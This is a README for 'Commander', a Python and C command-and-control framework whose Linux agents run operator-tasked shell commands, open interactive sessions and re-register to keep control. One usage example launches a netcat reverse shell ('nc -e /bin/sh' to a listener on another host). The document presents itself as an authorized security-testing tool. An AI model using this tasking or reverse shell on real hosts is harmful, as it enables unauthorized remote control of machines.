# Commander
Commander is a command and control framework (C2) written in Python, Flask and SQLite. It comes built-in with two Linux agents written in Python and C.

### Features
- Fully encrypted communications (TLS)
- Base64 data encoding
- RESTful API
- Supports CLI Clients
- Comes with a built-in Agent written in C for small footprint

### Agents
- Python 3
  - Additionaly to the C agent the python agent supports also sessions, an interactive shell between the admin and the agent
- C

### Requirements
Python >= 3.6 is required to run and the following dependencies
```
Linux
apt install libcurl4-openssl-dev libb64-dev
pip3 install -r requirements.txt
```

## Preview
![screenshot](screenshots/commander_cli.jpg)

## How to Use it
Start the admin.py module first in order to create a local sqlite db file
```
python3 admin.py
```
Continue by running the server
```
python3 c2_server.py
```
And last the agent. For the python case agent you can just run it but in the case of the C agent you need to compile it first.
```
# python agent
python3 agent.py

# C agent
gcc agent.c -o agent -lcurl -lb64
./agent
```

By default both the Agents and the server are running over TLS and base64. The communication point is set to 127.0.0.1:5000 and in case a different point is needed it should be changed in Agents source files.

As the Operator/Administrator you can use the following commands to control your agents 
```
Commands:

  task add arg c2-commands
    Add a task to an agent, to a group or on all agents.
    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' 
    c2-commands: possible values are c2-register c2-shell c2-sleep c2-quit
      c2-register: Triggers the agent to register again.
      c2-shell cmd: It takes an shell command for the agent to execute. eg. c2-shell whoami
         cmd: The command to execute.
      c2-sleep: Configure the interval that an agent will check for tasks.
      c2-session port: Instructs the agent to open a shell session with the server.
         port: The port to connect to. If it is not provided it defaults to 5555.
      c2-quit: Forces an agent to quit.

  task delete arg
    Delete a task from an agent or all agents.
    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' 
  show agent arg
    Displays info for all the availiable agents or for specific agent.
    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' 
  show task arg
    Displays the task of an agent or all agents.
    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' 
  show result arg
    Displays the history/result of an agent or all agents.
    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' 
  find active agents
    Drops the database so that the active agents will be registered again.

  exit
    Bye Bye!


Sessions:

  sessions server arg
    Controls a session handler.
    arg: can have the following values: 'start' or 'stop' 
  sessions select arg
    Select in which session to attach.
    arg: the index from the 'sessions list' result 
  sessions list
    Displays the availiable sessions

```

Special attention should be given to the 'find active agents' command. This command deletes all the tables and creates them again. It might sound scary but it is not, at least that is what i believe :P 

The idea behind this functionality is that the c2 server can request from an agent to re-register at the case that it doesn't recognize him.
So, since we want to clear the db from unused old entries and at the same time find all the currently active hosts we can drop the tables and trigger the re-register mechanism of the c2 server. See below for the re-registration mechanism.

## Flows
Below you can find a normal flow diagram
##### Normal Flow
![screenshot](screenshots/c2_normal_flow2.jpg)


In case where the environment experiences a major failure like a corrupted database or some other critical failure the re-registration mechanism is enabled so we don't lose our connection with our agents.

More specifically, in case where we lose the database we will not have any information about the uuids that we are receiving thus we can't set tasks on them etc... So, the agents will keep trying to retrieve their tasks and since we don't recognize them we will ask them to register again so we can insert them in our database and we can control them again.

Below is the flow diagram for this case.

##### Re-register Flow
![screenshot](screenshots/c2_reregister_flow2.jpg)

## Useful examples
To setup your environment start the admin.py first and then the c2_server.py and run the agent. After you can check the availiable agents.

```
# show all availiable agents
show agent all
```

To instruct all the agents to run the command "id" you can do it like this:

```
# for all agents
task add all c2-shell id

# check the results of the "id"
show result all
```

To check the history/ previous results of executed tasks for a specific agent do it like this:

```
# check the results of a specific agent
show result 85913eb1245d40eb96cf53eaf0b1e241
```

You can also change the interval of the agents that checks for tasks to 30 seconds like this:

```
# to set it for all agents
task add all c2-sleep 30
```

To open a session with one or more of your agents do the following.

```
# find the agent/uuid
show agent all

# enable the server to accept connections
sessions server start

# add a task for a session to your prefered agent
task add your_prefered_agent_uuid_here c2-session

# display a list of available connections
sessions list

# select to attach to one of the sessions, lets select 0
sessions select 0

# run a command
id

# return to the main cli
go back

# stop the sessions server
sessions server stop
```

If for some reason you want to run another external session like with netcat or metaspolit do the following.
```
# show all availiable agents
show agent all

# first open a netcat on your machine
nc -vnlp 4444

# add a task to open a reverse shell for a specific agent
task add 85913eb1245d40eb96cf53eaf0b1e241 c2-shell nc -e /bin/sh 192.168.1.3 4444

```
This way you will have a 'die hard' shell that even if you get disconnected it will get back up immediately. Only the interactive commands will make it die permanently.

## Testing
pytest was used for the testing. You can run the tests like this:
```
cd tests/
py.test
```
**Be careful**: You must run the tests inside the tests directory otherwise your c2.db will be overwritten and you will lose your data

To check the code coverage and produce a nice html report you can use this:
```
# pip3 install pytest-cov
python -m pytest --cov=Commander --cov-report html
```


**Disclaimer**: This tool is only intended to be a proof of concept demonstration tool for authorized security testing. Running this tool against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using this tool.
